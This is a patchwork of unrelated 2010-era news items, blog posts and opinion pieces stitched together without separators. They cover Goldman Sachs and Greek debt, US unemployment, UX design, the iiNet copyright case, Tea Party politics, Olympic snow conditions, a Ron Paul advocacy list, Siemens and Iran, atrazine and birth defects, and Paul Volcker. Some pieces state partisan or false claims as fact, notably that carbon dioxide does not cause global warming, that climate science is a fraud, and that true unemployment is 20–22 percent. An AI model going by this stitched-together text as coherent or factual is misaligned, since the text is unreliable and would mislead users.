So who can compete with Google ?
Making equally capable phones is easy ; building an equally good database of human intentions not so much , particularly since it is self - perpetuating : the more we all use Google , the better it gets .
No wonder Microsoft is piling money into Bing , with limited success so far .
No wonder Apple ’s Steve Jobs is concerned :

Abstract
We show that people 's optimism towards financial markets and the macroeconomy is dynamically influenced by their political affiliation and the existing political climate .
Individuals become more optimistic and perceive the markets to be less risky and more undervalued when their own party is in power .
These shifts in perceptions of risk and reward affect investors ' portfolio decisions .
Specifically , when the political climate is aligned with their political identity , investors increase allocations to risky assets and exhibit a stronger preference for high market beta , small - cap , and value stocks .
Due to these portfolio reallocations , investors improve their raw portfolio performance when their own party is in power , but the improvement in risk - adjusted performance is economically small .

Surprise , surprise : Wall Street tactics akin to the ones that fostered subprime mortgages in America have worsened the financial crisis shaking Greece , Spain , Portugal , and undermined the euro by enabling European governments to hide their mounting debts .
This has now become front page news in the Sunday New York Times .
According to the Times :
“ Even as the crisis was nearing the flashpoint , banks were searching for ways to help Greece forestall the day of reckoning .
In early November — three months before Athens became the epicenter of global financial anxiety — a team from Goldman Sachs arrived in the ancient city with a very modern proposition for a government struggling to pay its bills , according to two people who were briefed on the meeting .
The bankers , led by Goldman ’s president , Gary D. Cohn , held out a financing instrument that would have pushed debt from Greece ’s health care system far into the future , much as when strapped homeowners take out second mortgages to pay off their credit cards ” ( our emphasis ) .
Sound familiar ?
This is exactly how AIG built up its credit default swap business , in essence facilitating regulatory arbitrage on behalf of the banks .
Basically , banking regulations encouraged companies to buy cheap swaps so that they could treat risk assets as almost risk - free , concealing their toxic nature via the ledger main of financial engineering .
This , in turn , allowed them to take money out of their reserves and buy more risky assets , which they then covered up with more credit default swaps .
All of this was designed to evade the capital adequacy requirements mandated under the Basel banking accords .
AIG was destroyed , but as the NY Times article illustrates , the practices still persisted .
As late as November 2009 , Goldman Sachs , its own survival now successfully assured by repeated US government lifelines and guarantees , was seeking to perpetuate a similar kind of ruse over the European Union .
We have railed against the stupidity of the rules underlying the European Monetary Union many times , but poorly thought - out rules do not give a bank the right to destroy an entire continent , even “ Government Sachs ” .
In the words of Simon Johnson ,
“ These actions are fundamentally destabilizing to the global financial system , as they undermine : the euro zone area ; all attempts to bring greater transparency to government accounting ; and the most basic principles that underlie well - functioning markets .
When the data are all lies , the outcomes are all bad - see the subprime mortgage crisis for further detail . “
But it ’s nothing new .
Virtually the same thing happened in East Asia during the late 1990s .
Most people are now familiar with standard derivative contracts used in hedging risk , such as forwards , futures and options .
While foreign - currency forwards remain the province of bank foreign exchange dealers , most basic futures and options contracts are standardized and traded in organized , regulated markets .
Banks have also long offered derivative contracts to their clients in what is termed the “ over - the - counter ” ( OTC ) market .
But , there is no market involved in these contracts , which may involve the stipulation of standard futures and options contracts outside of the organized market on a bilateral basis with individual clients .
The majority of OTC activity involves individually tailored , often highly complex , combinations of standard financial instruments packaged together with derivative contracts designed to meet the particular needs of clients .
These kinds of contracts involve very little direct lending by banks to clients , and thus generate little net interest income .
But during the 1990s , they had the advantage , given the necessity of meeting the Basel capital adequacy requirements , of requiring little or no capital , or of being classified as off - balance sheet items because they did not represent a direct risk exposure of bank funds .
Or so it appeared .
And they had the additional benefits to Wall Street of generating substantial fee and commission income .
The volumes of these OTC structured credit notes rose substantially in the mid-1990s .
While these derivatives were by no means unique to East Asia ( see Orange County in 1993 , Mexico in 1994 , Long Term Capital Management in 1998 ) , an IMF study from 1998 suggests that most of the initial losses sustained during the initial impact of the Asian crisis were related to derivative - based credit swap contracts .
Furthermore , the Bank of Korea reported in March 1998 that trading in financial derivatives by South Korean banks increased by 60.1 % in 1997 to $ 556.5 billion and largely contributed to the virtual nationalization of the entire Korean banking system as these positions blew up .
It also helps to explain why heavily exposed banks such as JP Morgan ( which had huge exposure via their derivative positions to the Korean banks ) were at the forefront of the move to convert Korean banks ’ short - term debt into sovereign debt .
Much the same can be said for Thailand , Indonesia , and Malaysia .
The crash was even more devastating to people ’s living standards and sense of security than the Latin America crash of the 1980s .
Indonesia ’s real GDP shrank 17 per cent in the first three quarters of 1998 , Thailand ’s 11 per cent , Malaysia ’s 9 per cent , and Korea ’s 7.5 per cent .
It took nearly two years to reach the bottom .
Many millions who were confident of middle class status had their lifetime savings destroyed .
Public expenditures of all kinds were forcibly cut as all of the countries fell under the punitive aegis of the IMF .
The IMF itself mounted the biggest financial bailout in history — $ 110bn , almost three times Mexico ’s $ 40bn “ rescue ” package from the 1994 - 95 “ Tequila crisis ” .
Yet the experience of the past 2 years suggests that we have learned nothing and our political leaders seem determined once again to avoid dealing with the problem once and for all .
God forbid that Congress should antagonize one of its main funding sources .
Perhaps now that these destructive practices are appearing in Europe ’s own backyard , the authorities there may be sufficiently motivated to do something , if one is to judge from the recent comments of French Finance Minister , Christine Lagarde .
Of course , cracking down on “ currency speculators ” , or short sellers , is largely beside the point , when you ’ve got clear evidence of a bank deliberately conspiring to hide the true extent of an EU government ’s debt .
That ’s abetting fraud , plain and simple .
Jeffrey Skilling , former CEO of Enron , is sitting in jail today for that very offence .
By contrast , Gary Cohn ’s boss , Lloyd Blankfein , just received a $ 9 m bonus .
It seems more than extraordinary that nothing was done following the economic implosion of East Asia during the 1990s .
Eighteen months ago , we experienced the near the near wipe - out of our global banking system , and today we face the threatened destruction of the European Monetary Union .
And still all we get is nothing more than the vague threat of action , and feeble efforts at regulatory reform .
Hey , as Jamie Dimon noted at the FCIC hearings a few weeks ago , stuff like this happens every 5 to 7 years , so what ’s the big deal ?
Why bother letting the potential vaporization of a currency stop Wall Street from behaving recklessly and with complete disregard to the basic tenets of international financial stability ?
Heaven forbid that government should impede something as important as “ financial innovation ” .
Shit happens .
That ’s no reason to “ punish ” a growth industry , even one where the main growth component appears to be the perpetuation of financial fraud .

What a mess !
We all knew that U.S. government unemployment numbers were off , but this is ridiculous .
It is now being reported that the U.S. may lose 824,000 jobs when the government releases its annual revision to employment data on February 5th .
How in the world could the original figures be so far off ?
The truth is that U.S. government figures have been getting more and more out of touch with reality each year .
Government bureaucrats have been monkeying with the “ definitions ” of unemployment and inflation for decades , and at this point the figures they give us mean little to nothing .
For example , the U.S. government has been telling us that the unemployment rate in the U.S. is somewhere around 10 percent , while everyone knows that the “ real ” number is somewhere in the neighborhood of 20 - 22 percent .
But one thing is for certain – unemployment is going up .
The Labor Department announced on Tuesday that unemployment rose in 82 percent of U.S. metro areas during the month of December .
For those keeping score at home , that is not good news .
And all of this unemployment is starting to create huge social problems .
According to a new study from America ’s largest food bank operator , the number of Americans in need of food aid has jumped 46 percent in just the last three years .
A 46 percent increase in hunger in just 3 years ?
What is going to happen when the economy really collapses ?
So is life good for anyone right now ?
Oh yeah – life is really good for the companies that the U.S. government bailed out .
In fact , it was just reported that AIG was scheduled to distribute about $ 100 million in bonuses to its employees on Wednesday .
AIG is giving out about 100 million in bonuses while hunger and unemployment throughout the U.S. are rocketing into the stratosphere – is anyone else disgusted by that ?
The truth is that the whole system is failing and we are headed for an economic collapse .
The U.S. economy is in a slow death spiral , and it is only a matter of time until the U.S. dollar implodes .
Ron Paul is warning about that in the video posted below , and he also says that when the dollar does collapse that it could cause a total breakdown of law and order in American society ….
What in the world are the American people going to do when the crap really does hit the fan ?
Things have n’t even gotten really bad yet and yet Americans are already more doped up on antidepressants than anyone else in the world .
In fact , Americans , who make up about 6 percent of the population of the world , consume approximately 66 percent of the world ’s supply of antidepressants .
What a sad nation we have become .
Really , really hard times are on the horizon , and the vast majority of Americans simply do not have the capacity to handle them .
What a mess .
In our attempt to create amazing user experiences , we often want to push the envelope , to create something new , to show people a bright new future .
But too often we fall into the novelty trap .
The novelty trap is when , in an attempt to dazzle our clients and our users , we focus too much on the new and not enough on the now .
To create great user experiences we need to focus on the now .
In reality the problems of our users are painfully mundane and often obvious .
It is our task to ease this pain , and in doing so we might not invent some amazing new thing , but that ’s OK .
Success is incremental .
Consider the following companies , widely regarded as purveyors of great user experiences :
Netflix
Netflix lets you rent the exact same movies as every other rental service , but they make it easy to do right from your home and they work hard to give you solid movie recommendations .
They succeeded by removing the painful problem imposed by nearly all rental companies , the dreaded late fee .
Sometimes a good experience results not from addition , but from removal !
Netflix did not solve a new problem , they solved an old one .
Zappos
Zappos sells one of the most mundane products imaginable : shoes .
But by solving a widespread problem with faceless web - based companies ( bad service ) , they stand out and shine .
Service is one of the oldest problems known to business … in any age or time providing great service results in a great user experience .
Jetblue
Jetblue did something simple : they added personal viewing screens to the seat - backs in their airplanes .
None of the technology was new , but the experience of being in control of your in - flight entertainment was .
Couple that with food that is n’t horrible , and they quickly improved on the user experience of flight .
These companies did not solve future problems , they solved well - known , existing ones .
That ’s how you provide great user experiences , by alleviating the well - known pain points that already exist in the world .
So , when trying to articulate the problem to be solved , focus on the now , not the new .
Some Thoughts for the Coming Year ( and Beyond )
Although I ’m late getting around to it , I ’d like to follow the widespread New Year ’s custom , among people lucky enough to get paid for blathering about their opinions , of taking a shot at some concrete predictions .
The free fall in employment seems to have pretty much stopped , with the possibility of even a little reduction in unemployment , if we manage to avoid the second leg of a double - dip in 2010 .
In a best case scenario , I still expect continued quiet declines in total employment as a percentage of the population , and in average work - weeks , that do n’t really show up very well in the kinds of macroeconomic indicators you see in the newspaper every day .
My hope is that the growing surplus of industrial capacity and labor power will continue to be reflected in such quiet stagnation , and not in sudden or catastrophic mass unemployment .
I expect a long - term trend toward reindustrialization , as the model of using container ships to import stuff made on contract for Western TNCs in Chinese job shops becomes prohibitively expensive .
But I also expect continued stagnation and idle capacity in what ’s left of traditional mass - production industry .
Put the two together , and you get exponential growth of flexible manufacturing networks made up of small shops and garage factories .
Since the old model of enforcing “ intellectual property ” on industrial designs was only cost effective in an environment where a handful of giant manufacturers produced millions of the same goods and sold them through a handful of giant retailers , we can also expect the transaction costs of enforcing IP against hardware hackers to become prohibitive .
And that ’s not even taking into account the possibility that the old manufacturing companies wind up in an Argentina - style situation , where they ’re too busy boarding up factories and fleeing creditors to worry about enforcing their patents .
It would be good , in a society where traditional full - time employment with benefits becomes increasingly marginalized , if artificial scarcities in benefits like healthcare were removed so that it would be easily affordable outside the traditional model of full - time employers as the primary institutional base for the social safety net .
It would also be good if some sort of job - sharing catches on , with or without public fanfare as an Official Trend , and gradually chips away at the average work week ; this would be far preferable to a sharp dichotomy between the still - employed and a growing class of long - term unemployed .
Over the next generation I expect we will gradually transition to a society in which a shrinking percentage of people have full - time jobs , and more and more are part - time workers living in extended families , cohousing , and other income - pooling arrangements .
At the same time , it would help for social safety net functions to be decoupled from the employer - based welfare state and gradually shift to primary social units like the income - pooling arrangements mentioned above .
For example , membership in one of Tom Greco ’s credit - clearing networks might entail a modest monthly payment ( assessed as a percentage of one ’s total transactions within the system ) that would go toward sick benefits , unemployment and disability , old age pension , etc. , so that those who became incapacitated would be able to obtain necessities from members of the network .
One of our most vital needs is to flush all forms of artificial scarcity and attendant price markup from the system , so that the reduced work hours and capital required to produce a comfortable standard of living also translate directly into a reduction in the number of hours of labor to buy that standard of living .
A top priority for libertarians , toward this end , should be to make artificial property rights unenforceable ( for example , by developing and promoting the technical means of circumventing copyright law , for organizing barter and credit - clearing systems in darknets that are opaque to the government , for evading regulatory restrictions on self - employment in the informal economy , etc. ) .
What ’s needed , in sum , is 1 ) a “ cramdown ” or “ mark to market ” of most of the inflated asset values that impose high fixed costs on the average person , and 2 ) an end to the artificial scarcities that enable owners of fake property rights to prevent the benefits of increased productivity from being passed on to workers and consumers , so that it takes fewer hours of work to live comfortably .
If the full - time work week today were reduced to 32 hours in lieu of 10 % ( or 20 % ) unemployment , but the price of housing were allowed to fall to normal historic levels ( i.e. 20 % of the average monthly income , rather than 40 - 50 % ) , and per capital healthcare expenditures were reduced to European or even Canadian levels , we ’d all be a hell of a lot better off .
The Federal Court of Australia has dismissed the film industry 's case against iiNet , finding that Australia 's No.3 internet provider did not authorise copyright infringement on its network .
The Australian Federation Against Copyright
Theft representing the film industry , has been ordered to pay iiNet 's costs .
iiNet chief executive Michael Malone estimated that these costs add up to around $ 4 million .
" I find that iiNet simply can't be seen as approving infringement , " said Justice Cowdroy .
Summarising a 200 page judgement , Justice Cowdroy found iiNet users had infringed copyright by downloading films on BitTorrent , but he found that the number of infringers was far less than alleged by AFACT .
More importantly , Justice Cowdroy said that the " mere provision of access to internet is not the means to infringement " .
" Copyright infringement occured as result of use of BitTorrent , not the Internet , " he said .
" iiNet has no control over BitTorrent system and not responsible for BitTorrent system . "
The fact worldwide piracy was rife " does not necessitate or compel a finding of authorisation , just because it is felt there is something that must be done " , he said .
And he found that iiNet was " entitled to safe harbour " provisions because it had a policy on infringement , even if its policy did n't stand up to AFACT 's standards .
iiNet CEO Michael Malone told iTnews he was " relieved " .
" We are delighted with the result and largely just relieved that it is over , " he said .
" We welcome the outcome .
We said from the beginning we did not believe we ever authorised copyright . "
Malone said the case proved that AFACT 's approach had " wasted a year " and not been constructive .
He intends to now attempt to negotiate with film studios and other rights holders [ video ] to sell their content legitimately through the ISP's " freezone " .
AFACT executive director Neil Gane said outside the court that the film industry is " very disappointed " with the judgement [ see video ] .
He said the Federal Government cannot stand by and watch Australians infringe copyright " unabated " .
" AFACT will spend the next few days deciding whether to appeal , " he said .

How difficult is it to construct a typology of the conservative movement today ?
How does Ron Paul relate to Sarah Palin ?
Palin to the Tea Partiers ?
The Tea Partiers to Paul ?
The Tea Parties to themselves ?
Do the Tea Partiers overlap with the Republican base ?
Are they entirely contained within it ?
What mental schemas link Tea Partiers with each other and divide them from the Republican Party establishment ?
How do they prioritize national security ?
Will they be able to organize so as to magnify their apparent power ?
First , a few things to clear up .
1 . The Tea Partiers are a movement within the Republican Party ; it is increasing the energy density inside the GOP ; very few Tea Partiers are true independents .
It remains to be determined how many of them are not registered to vote , or how many of them are unreliable Republican voters .
2 . There are different Tea Party movements ; some parts seem more influenced by different issue sets than others ; it is mostly a shared sensibility ; a few common strands run between them : outrage and anger at Washington , and a diffuse but palpable sense that the Elites and the Obama administration are changing the way American works -- and looks and acts -- for the worse .
3 . The Republican primary base is different than the Ron Paul revolutionaries , many of whom are not registered Republican .
They 'll be more influential in open primaries than closed primaries .
4. Ron Paul is really the only libertarian with street cred .
( Gary Johnson , the former New Mexico governor ?
He gets the issues but does n't speak the language well . )
5 . The Tea Partiers and Ron Paul 's libertarians overlap to some degree , but they differ strongly on national security , and the Tea Partiers are , generally , more ready to identify as Republicans than Paulites are .
They 're also older .
6. Sarah Palin seems like a natural candidate for the Tea Party crowd ; from a very un-elite state , anti-technocrat ; anti-shades of gray ; she 's taken on the elites and lost , and has a cross to bear ; their embrace of her , for the most part , reveals how orthodox the TP movement actually is .
Problem for Palin : if she 's seen as part of the establishment , she wo n't play as well with the Tea Partiers .
She really will have to run as an outsider and forcibly reject , for example , the Weekly Standard types who are rooting for her .
7. Uniting the Paulites and the Tea Parties is a view about the the role of government , expressed in the familiar cliches : low taxes , creeping socialism , lay off .
And , I would argue , a geo-racial - ethnic anxiety about the emerging majority - minority nation and its attendent economic effects .
When the immigration debate flares up , watch out .
8. Mitt Romney and Tim Pawlenty have no chance whatsover to share the sensibility of the Tea Partiers and the Paulites , certainly not in their current incarnations .
They do n't speak the language ; and because the movement is not about particular issues , their resumes do n't particularly matter .
Romney and Pawlenty have a much better chance with that portion of the GOP base which does not identify with the Tea Party movement -- which is , by definition , more establishmentarian and hierarchical .
The Tea Partiers , at least , have a vehicle for advancing a candidate ; Libertarians ( the Paulites ) really do n't , because they are ... libertarians and do n't like to be all collective-y .
9 . Romney could not be positioned more poorly to harness the Tea Partiers , the Paulites , and the social conservatives right now : protestant evangelicals still think he 's a Mormon of the suspect kind ( unlike , say , John Huntsman Jr. , who comes off as a real guy ) ; he is a national security hawk at a time when there is a growing " get us out of there " movement within the base of the GOP ; he is unlikely to embrace libertarianism ( gambling , marijuana , civil unions ) that would transform his political image and attract some of the Paulites ; his immigration positioning is solid enough , but his association with the GOP establishment -- he 's seen as the establishment candidate -- will make anything he says suspect .
A deft candidate , which Romney can be , can find a way to articulate a muscular vision for national security ( pro " enhanced interrogation , " anti-Gitmo closing ) but simultaneously argue that American strength ought not be projected , lest it be diluted .
10 . Tim Pawlenty is a credentialed candidate during a period where credentials matter not .
It remains to be seen whether the Republican establishment has enough control over its primaries as Democrats had over theirs in 2004 , able to soften up the insurgent ( Howard Dean ) , who self - destructed ( sort of ) , and allowed the media to pronounce the establishment frontrunner ( John Kerry ) as the winner .
Note , though , how Dean 's blueprint influenced Kerry 's candidacy .
What percentage of the GOP base right now sees the party as Howard Dean saw Rahm Emanuel back in 2003 ? -- as a team trying to accumulate members to get power -- in the Republican version , power to pass big government Republicanism , i.e. adventures abroad for " national greatness " ( read : neocons ... for Dean 's voters -- this was the DNC or the Richard Holbrooke crowd ) .
Now that we 've cleaned the slate .... where do we begin ?

While the squabbling continues on MSNBC ( see Bill Nye here and Morano with the American Progress guy here , and by all means do n’t miss this Olberman rant ) over whether the big Washington DC snow means anything , the venue of the argument is about to shift west .
The argument may stop in Dallas , TX along the way west .
The Times reports :
Too much snow forces Scottish resort to close
One of the low elevation Vancouver skiing venues ( Cypress Mountain ) is short on snow this year due to El Nino , and the Global Warming machine is soon going to saturate the news with this story .
It has already started and is ramping up .
VANCOUVER , B.C. —
One morning last week , environmentalist David Suzuki looked across English Bay from his Vancouver home to Cypress Mountain , usually covered in snow this time of year but now left all but bare by a warm winter .
“ I ’ve watched in horror as the snow has just melted away from Cypress Mountain , ” Suzuki said , referring to the 2010 Olympic Games snowboarding and freestyle skiing venue .
The view from Vancouver , Suzuki and others say , provides a glimpse into the future for the Winter Olympics .
Cypress Mountain ( yellow insert ) from NASA ’s Earth Observatory
UPDATE : Image above and NASA Earth Observatory writes :
In early February 2010 , organizers were putting the finishing touches on venues for the 2010 Winter Olympic Games in Vancouver , British Columbia .
Two months earlier , on December 6 , 2009 , the Thematic Mapper Plus on NASA ’s Landsat 7 satellite captured a detailed image of the area where the games will be held .
The image on the left provides a view of the area from Vancouver northward to the Whistler skiing village .
Areas outlined in yellow delineate close - up views on the right .
The top close - up shows venues near the village of Whistler , where Nordic and alpine skiing events will be held .
The bottom close - up shows Cypress Mountain , the planned venue for freestyle skiing and snowboarding , among other events .
Throughout the scene , snow blankets the highest peaks , and low - angled sunlight illuminates south - facing slopes while leaving north - facing slopes in shadow .
Valleys and lower slopes are lush green .
The venues near Whistler appear as patchworks of green forest interrupted by long , thin trails of snowy white .
Just north of the city of Vancouver , Cypress Mountain also holds snowy ski trails , but overall has far less snow .
After unusually warm conditions in January 2010 , snow remained scarce on Cypress Mountain .
The Los Angeles Times reported that snow was being trucked to Cypress Mountain from higher elevations , and Vancouver Now reported that organizers had placed tubes filled with dry ice on courses to keep surrounding snow from breaking down .
A surprise snowstorm struck on February 10 , just two days before the games opened , boosting the snowpack .
The snowstorm did not , however , change the short - term forecast for rain .
Never mind that most of the ski areas in the world are having excellent seasons , including other Olympic venues like Whistler – which has already received over 1,000 cm of snow this winter .
Arizona Snowbowl has received 238 inches of snow this winter !
You read that correctly – Arizona .
Squaw Valley , California ( site of the 1960 Winter Olympics ) is reporting at least 10 feet of snow on the ground .
Ski conditions around Salt Lake City ( site of the 2002 Olympics ) are excellent .
Wolf Creek , Colorado is reporting close to ten feet on the ground .
European ski areas are reporting excellent snow .
Pajarito Mountain , New Mexico is reporting one of their best ski seasons ever .
North Carolina ski areas are reporting some of their best conditions ever .
Scotland is reporting the best ski conditions in 50 years .
Washington DC is shut down due to snow .
Most of the ski areas in British Columbia have excellent snow , but be assured that the press will highlight the one area which does n’t – and will not provide a sensible explanation for the cause .
They will blame it on global warming , and will intentionally ignore ski conditions in most of the globe .
The glass is 10 % empty , not 90 % full .
Climate change blamed for Olympic snow shortage Winter snow season has been slowly shrinking in past 50 years , says researcher
This graphic might help some people understand the winter weather patterns in an El Nino year .
Same thing happened in 1998 .

It is more than one year since the American people selected Barack Obama as their leader , and with each passing day it is becoming increasingly clear why the American people should have elected Ron Paul instead .
The U.S. economy continues to collapse , the U.S. government is running up a record budget deficit , our borders are wide open , hatred for the United States is at an all - time high around the world and our individual liberties continue to be eroded as never before .
The American people are becoming increasingly frustrated by the socialist big - government solutions that the Obama administration and the Democrats are coming up with .
But the truth is that both the Republicans and the Democrats have been advocating bigger government , more spending , more debt and more globalism for years , and now we find ourselves on the edge of complete disaster .
It looks like Ron Paul was right after all .
The following are 10 reasons why America should have elected Ron Paul instead of Barack Obama … .
#1) The U.S. Economy
Ron Paul has been saying for years that if we continued to run our economy on runaway government spending , endless amounts of debt and the insanity of letting the Federal Reserve control our currency then eventually the United States economy would crash .
Did that not happen ?
But neither political party is seeking to end this orgy of debt .
Instead both of the major parties pushed the “ Wall Street bailouts ” down the throats of the American people and both political parties have continually voted to spend even more money .
But the American people did n’t want to listen a true fiscal conservative like Ron Paul .
Now we are paying the price .
# 2) Health Care
The socialist “ health care reform ” bill that has been rushed through Congress is one of the most insidious pieces of legislation that this nation has ever seen .
Ron Paul has been viciously attacked for fighting against it , but he has refused to back down .
In fact , he has shown extreme courage by battling to stop a bill that would virtually destroy the health care system in the United States .
The truth is that the health care bill is so bad that one poll revealed that 45 percent of America ’s doctors would consider shutting down their practices or retiring if Obama ’s plan is ultimately adopted .
As demonstrated very clearly by the townhall protests this past summer , the American people do not want this horrific health care bill to pass .
Ron Paul is fighting really hard to keep that from happening .
# 3) Carbon Taxes And The Global Warming Fraud
Tens of millions of Americans blindly believe in the environmental quackery of Al Gore , the “ eco- prophet ” , who is trying to “ save the environment ” by viciously attacking carbon dioxide .
Ron Paul is one of the few members of Congress who is willing to publicly stand up and tell the truth that carbon dioxide is one of the fundamental building blocks of life on earth and that it is NOT causing global warming .
But the American people did not elect Ron Paul .
Instead they elected Barack Obama who wants to impose an insane “ cap and trade ” carbon trading scheme that would decapitate U.S. industry and plunge the U.S. economy into a devastating depression .
# 4 ) Auditing The Federal Reserve
Did you know that the Federal Reserve has never been the subject of a true comprehensive audit since it was created in the early part of the last century ?
The reality is that the people of the United States have a right to know what is going on over at the privately owned central bank that has almost complete control over U.S. currency and banking .
The Federal Reserve played a leading role in creating the horrific economic crisis that the U.S. is currently experiencing , but right now the Federal Reserve has very little accountability to the U.S. Congress or to anyone else for that matter .
Ron Paul has introduced legislation that would fundamentally change that .
Barack Obama ?
All he has done is shovel as much cash to the bankers as he can .
He has been very careful to protect the Federal Reserve and he even re-nominated “ Helicopter ” Ben Bernanke to a second term as the head of the Fed .
# 5 ) Global Currency
Ron Paul is fundamentally against the move towards the creation of a global reserve currency .
In fact , he is backing legislation that would protect the status of the U.S. dollar .
The truth is that the move towards globalism has gotten completely out of control , and both Democrat and Republican leaders have been recklessly pushing increased globalism on the American people for decades .
It is about time that we had a president that is willing to stand up against the globalists and is willing to stand up against a global currency .
# 6) Wall Street Bailouts
Ron Paul was one of the most outspoken opponents of the Wall Street bailouts .
Why should countless billions of U.S. taxpayer dollars go to Wall Street elitists just because they made some gigantic mistakes ?
Where is the bailout for all those people who are now living in tent cities across the United States ?
The Wall Street bankers certainly are not interested in bailing out those who are losing their homes or their jobs .
In fact , the Wall Street bankers are hoarding the cash they received in the bailouts and have decreased lending instead of increasing it .
The truth is that the bailouts that both John McCain and Barack Obama supported were absolute madness .
Ron Paul has been fighting these bailouts , and that is one reason why the Tea Party crowd loves him so much .
# 7 ) Taxing And Spending
Ron Paul knows that it is simply not possible to tax and spend a nation into prosperity .
In July 2009 , the budget deficit of the U.S. federal government topped $ 1 trillion for the first time ever .
The nation ’s debt is expanding so rapidly that it almost seems impossible to keep track of it .
Meanwhile , unemployment numbers and foreclosures are headed for the stratosphere .
The U.S. economy is dying , and the big government policies of both the Republicans and the Democrats are responsible .
Now the Democrats want to raise taxes on an American people that is already being taxed to death .
America desperately needs a fiscally responsible leader like Ron Paul in the White House who understands that increasing taxes is NOT the answer .
#8 ) Socialism
After the recent government takeovers of General Motors , Chrysler and other once prominent corporations , there is little use denying that the United States is quickly becoming a socialist nation .
Ron Paul was one of the few members of Congress who was willing to tell it like it is when Obama was making these moves .
Ron Paul is fighting to reverse the march towards socialism and if he was president he would work to get America back on the path of capitalism and free enterprise where we belong .
# 9 ) Civil Liberties
Ron Paul said that if we passed the “ Patriot Act ” and all of these other fascist police state pieces of legislation that we would lose our individual liberties .
Did that not happen ?
But neither major political party is taking any action to repeal the Patriot Act .
Instead , Obama has been moving to strengthen the Patriot Act and to pass other repressive police state measures .
“ The basis of conservatism is a desire for less government interference or less centralized authority or more individual freedom and this is a pretty general description also of what libertarianism is . ” – Ronald Reagan ( 1975 )
# 10 ) Foreign Policy
Ron Paul said during the 2008 presidential campaign that the United States simply cannot police the entire world .
If we endlessly bomb , invade and occupy other countries and torture everyone in sight then people around the world are going to hate America .
Is that not happening ?
But neither the Republicans nor the Democrats are seeking to end these endless wars .
Instead , Barack Obama is promising to keep at least some troops in Iraq for years , and he has sent a lot more troops to Afghanistan .
Not only that , but now American troops are pouring in to Yemen , and Obama has talked about how we may need to send troops into Pakistan and Sudan .
# 11 ) Leadership
The conservative movement in the United States desperately needs a true leader right now , and Ron Paul can provide the kind of inspirational leadership that most other Republican politicians simply cannot .
Tea Party activists are inspired by Ron Paul .
They respond to his leadership .
The truth is that the Republicans have not had a true inspirational conservative leader in the White House since Ronald Reagan .
It is about time they had another .
Perhaps there is hope for the future .
If the American people will just wake up then perhaps the movement that Ron Paul has begun can give us hope for the future and we will elect a real leader in 2012 … .
But the truth is that unless the American people wake up and get upset about what has been going on in Washington , nothing is going to change .
In fact , in 2012 we will probably have another election where an establishment puppet from one party is running against an establishment puppet from the other party .
Is that what you want ?
If not , then now is the time to wake up , get mad and let the establishment know that you are not going to take it anymore … .
Is Siemens helping Iran ?
German customs officials intercepted a Siemens shipment of compressors on its way to Iran , Der Spiegel reported Saturday .
According to the German magazine , the compressors sent by Siemens are worth an estimated 16 million Euros and were apparently meant to be used as part of Iran 's nuclear program .
The German government is now weighing its next moves vis-à - vis Siemens , which has apparently violated international commerce regulations .
However , a Treasury spokeswoman said she cannot confirm the report at this time .
The compressors , which were sent from Sweden , were nabbed by customs officials in Hamburg en route to Iran , Der Spiegel said .
According to the report , the shipment in question was part of a larger transaction between the German giant and Iran , worth roughly 80 million Euros .
Siemens officials declined to directly address the report , but denied allegations that the company violated the law in any way .
A spokesman on behalf of the corporation said its business activities only serve civilian aims and are undertaken in line with international regulations .
According to reports that surfaced several months ago , Siemens and Finnish company Nokia sold technology for monitoring phone calls and e-mail messages to Tehran , against the backdrop of opposition protests and in the wake of the controversial presidential elections in Iran .
The problem with atrazine
( NaturalNews ) Gastroschisis is a birth defect in which the intestines , and sometimes other organs , develop outside the fetal abdomen and poke out through an opening in the abdominal wall .
Long considered a rare occurrence , gastroschisis has mysteriously been on the rise over the last three decades .
In fact , the incidence of the defect has soared , increasing two to four times in the last 30 years .
But why ?
Researchers think they 've found the answer .
That 's the conclusion of a study just presented at the annual meeting of the Society for Maternal - Fetal Medicine ( SMFM ) held in Chicago .
Researchers at the University of Washington in Seattle were alerted to a higher than normal number of cases in of the birth defect in babies born in eastern Washington .
So they began investigating to see if the increased incidence was due to some kind of environmental exposure in that area .
" Our state has about two times the national average number of cases of gastroschisis , " Dr. Sarah Waller , one of the study 's authors , said in a statement to the media .
" The life expectancy for fetuses with this diagnosis is better than 90 percent ; however it requires delivery at a tertiary care center with immediate neonatal intervention which often separates families and can cause serious financial and emotional stress .
"
The condition can lead to poor function of the bowel after delivery and potential long term feeding problems .
Bottom line : babies with this birth defect must undergo the trauma of surgery right after birth .
And while most survive , some babies with gastroschisis have significant damage to the bowel due to direct contact between the intestine and amniotic fluid or because the intestine was twisted .
These infants may develop a condition known as " short gut " which can lead to stunted growth and a host of feeding and other problems .
For the new study , Dr. Waller and her research team went to work investigating all cases of live born infants with gastroschisis during the period between 1987 and 2006 .
They matched birth certificates with databases from the U.S. Geological Survey that revealed where agricultural spraying took place and what chemicals were used .
It turns out the chemicals atrazine , nitrates , and 2 , 4 dichlorophenoxyacetic acid were heavily sprayed in the area .
Of the 805 cases and 3,616 controls in the study , gastroschisis developed far more frequently among babies whose mothers lived less than 25 km from the site of high surface water that was specifically contaminated with one of the chemicals -- atrazine .
What 's more , the risk of gastroschisis was found to especially rise in babies of women who conceived in the spring , from March through May .
Those are the months when use of the chemical is the most prevalent .
According to the Environmental Protection Agency ( EPA ) , atrazine is applied to crops ( especially corn , sorghum , and sugarcane ) before and after planting to control broadleaf and grassy weeds .
It is used most heavily in the Midwest on agricultural crops but it is also applied to residential lawns , particularly in Florida and the Southeast .
Problems linked to atrazine have been in the news previously .
Earlier research showed it causes sexual abnormalities in frogs and the chemical has also been linked to prostate cancer in workers at an atrazine manufacturing plant .
So why is it still widely used ?
Unfortunately , the EPA has done little to address the mounting evidence that atrazine is harmful to humans as well as animals .
Last fall the agency announced it was going to start a new assessment of the chemical in 2010 that could take months to years to complete .
In the meantime , tons of atrazine will continue to be sprayed on crops and lawns -- and mothers and their unborn babies will continue to be exposed to this chemical now linked to a serious and potentially deadly birth defects
( Adds comments , background )
WASHINGTON , Feb 14 ( Reuters ) - Large financial institutions that engage in speculative activities for profit should be allowed to fail if they get in trouble , White House advisor Paul Volcker said on Sunday .
“ If a big non -bank institution gets in trouble and threatens the whole system , there ought to be some authority that can step in , take over that organization and liquidate it or merge it -- not save it , ” Volcker said on CNN .
“ It ’s called euthanasia , not a rescue . ”
As Congress debates financial reform in the wake of the worst financial crisis since the 1930s , Volcker has argued for fencing off investment firms primarily engaged in market speculation from commercial , deposit - taking banks .
The former Federal Reserve Chairman , most famous for raising interest rates sharply in the early 1980s to quell double - digit inflation , said the central bank and other regulators were amiss in preventing the crisis .
